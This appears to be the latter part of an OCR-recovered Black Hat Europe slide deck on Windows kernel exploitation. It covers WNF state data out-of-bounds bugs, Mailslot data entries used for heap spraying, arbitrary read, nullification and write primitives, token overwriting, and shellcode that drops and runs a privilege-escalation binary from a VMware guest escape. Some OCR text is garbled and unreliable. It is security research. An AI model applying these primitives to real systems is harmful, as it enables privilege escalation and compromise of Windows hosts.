ExpWnfCreateNamelnstance( }
pMaxDataSize,
Information Classification: General 50
```

## Slide 51

## WNF_STATE_DATA – Big Chunk OOB Write

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 85/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
WNF_STATE_DATA - Big Chunk OOB Write
NtUpdateWnfStateData
_int64 _ fastcall ExoNtUpdateWnfStateData(
res = ExpWnfValidatePubSubPreconditions( an
2u, Typeld = Statelnfo->Typeld;
&lnstance->StateNamelnfo, if (!Typeld ) _
Write Size return Statelnfo->MaxStateSize < Size ? OxCOOQO00D : 0;
v34); } Cannot write more than 0x1000 bytes
if (res <0) (MaxStateSize <= 0x1000)
goto ERROR;
Information Classification: General 51
```

## Slide 52

## WNF_STATE_DATA – Big Chunk OOB Write

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
WNF_STATE_DATA - Big Chunk OOB Write
NtUpdateWnfStateData
_int64 _fastcall ExoNtUpdateWnfStateData(
OOB Write is not possible for chunks of size 0x1000
v34); } Cannot write more than 0x1000 bytes
if (res <0) (MaxStateSize <= 0x1000)
goto ERROR;
```

## Slide 53

## WNF_STATE_DATA – Big Chunk OOB Read

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 82/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
WNF_STATE_DATA - Big Chunk OOB Read
NtQueryWnfStateData
_int64 _ fastcall ExoNtQueryWnfStateData(
) > _int64 _ fastcall ExpWnfValidatePubSubPreconditions(
{ a
res = ExpWnfValidatePubSubPreconditions( — x id = StateInfo->Typeld
lu, ypeld = Statelnfo->Typeld;
0, ) Read Size == O!!? return StatelInfo->MaxStateSize < Size ? OxCOOQ000D : 0;
v1): } Always pass the size validation
goto ERROR;
}
Information Classification: General 5 3
```

## Slide 54

# Mailslot Object

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Mailslot Object
Mechanism for one-way interprocess communications
Information Classification: General
Write Thread2
Create (\\mailslot\\xxx)
Thread1
rea
7x Write
Read
https://learn.microsoft.com/en-us/windows/win32/ipc/mailslots
Thread4
54
```

## Slide 55

# Mailslot Data Entry

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Mailslot Data Entry
Mailslot manages multiple received data using Data Entry Queue
Data Entry1 Data Entry2 jag Data Entry3 Data Entry4
```

## Slide 56

# Mailslot Data Entry Object

-

-

-

-

-

-

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Mailslot Data Entry Object
Size-Mutable object and contains useful members
struct mailslot_data_entry
. {
Sprayable Object int is_overflowed;
¢ By calling WriteFile multiple times from another thread int field_4;
LIST_ENTRY data_queue_list;
¢ By creating multiple mailslot handles PIRP irp;
. . DWORD data_size;
¢ Almost no size limit ( < 4GB) int field_24:
BYTE *buffer_ptr;
WorkContext *worker_context;
char buffer[];
};
Allocated in paged pool
Information Classification: General 56
```

## Slide 57

# Out-of-Bound Read

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Out-of-Bound Read
... (Doesn't matter)
BufferPtr
MsPeek()
```

## Slide 58

# Arbitrary Read

Information Classification: General

#BHEU @BlackHatEvents

## Slide 59

# Leaking Critical Object Address

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Leaking Critical Object Address
MsWrite() a»
Mailslot Data Entry
Mailslot Context
Data Entry List ak see process
DataSize a read List
BufferPtr Requestor Process
Buffer
59
Current Thread Object
```

## Slide 60

# Arbitrary Nullification

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Arbitrary Nullification
MsRemoveDataQueueEntry
MsRead() vs
IRP = entry->IRP;
{
}
Mailslot Data Entry
MsCancelTimer(entry);
IRP (valid addr)
WorkContext = entry->WorkContext;
if (WorkContext )
Buffer {
WorkContext->IRP = 0164; Nullification
MsCancelTimer
Information Classification: General 60
```

## Slide 61

# Arbitrary Write

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 85/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Arbitrary Write
Mailslot Context
Type Confusion
Mailslot Data Entry Nullification
@ Leak Mailslot Gontext Queue Status (QUEUE_WATING)
Data Entry List —L ——_—_ © Nullify Queue Status
Data Entry List
Ist MsWrite() a DataSize
© Create Data Entry BufferPtr lvaraitedts sd beet)
Buffer
@® Overwrite BufferPtr
2nd MsWrite() memcpy(Oxffffcafedeadbeef,
UserBuffer,
© Trigger Arbitrary Write UserSize)
Information Classification: General 61
```

## Slide 62

# Exploitation - Layout

Information Classification: General

#BHEU @BlackHatEvents

## Slide 63

# Exploitation – Mailslot Header Info Leak

HEADER1 HEADER2
LIST->FD LIST->FK
....

Information Classification: General

#BHEU @BlackHatEvents

## Slide 64

# Exploitation – Leveraging Arbitrary Nullification

HEADER1 HEADER2
LIST->FD …
WorkerCtx …
....

Information Classification: General

#BHEU @BlackHatEvents

## Slide 65

# Exploitation – Token Overwriting

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 87/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Exploitation — Token Overwriting
Current EPROCESS Init EPROCESS
ActiveProcessLinks = = =P ActiveProcessLinks
Process
Token — aa Token
Overwrite
```

## Slide 66

#BHEU @BlackHatEvents

## Slide 67

# Run the Windows LPE exploit

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 79/100 on the text kept, 66/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
1. shellcode runs in vmware-vmx
) Windows11_23h2 - VMware Workstation - ox
Home [pe Windows11_23h2
Windows11_23h2 x +
reversing privexe vmwarelog
Gees \
bootloader | ay 7
Monday, September 23, 2024
Information Classification: General 67
```

## Slide 68

# Drop the Windows LPE exploit

-

....
Free
VGA text video buffer
monochrome region
VGA graphics video buffer
conventional memory

Information Classification: General

#BHEU @BlackHatEvents

## Slide 69

# Run the Windows LPE exploit

2
3 5
6
10 11
14
....

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Run the Windows LPE exploit
Build a shellcode
1. Call CreateFile(‘priv.exe’, ...)
2. Read Windows LPE binary blocks and write to file
LPE binary conventional memory
2 block_table = [2,3,5,6,10,11,14, ...];
5
saved by guest
for(i=0; i<nblock; i++) {
10 11 readPhysmem(block_table[i] * PAGE_SIZE, buf):
WriteFile(hFile, buf, PAGE_SIZE);
}
14
3. Call WinExec('‘priv.exe’, ...)
Information Classification: General 69
```

## Slide 70

#BHEU @BlackHatEvents

## Slide 71

# Conclusion

-

-

-

-

Information Classification: General

#BHEU @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Conclusion
Focused, short-term goals lead to valuable learning (e.g., Pwn20Own)
Improving reliability is crucial but challenging
Exploit chaining isn't always straightforward
Prepare for upcoming mitigations in advance
```

## Slide 72

# Questions?

-

-

-

-

-

-

-

Information Classification: General

#BHEU @BlackHatEvents

## Slide 73

#BHEU @BlackHatEvents
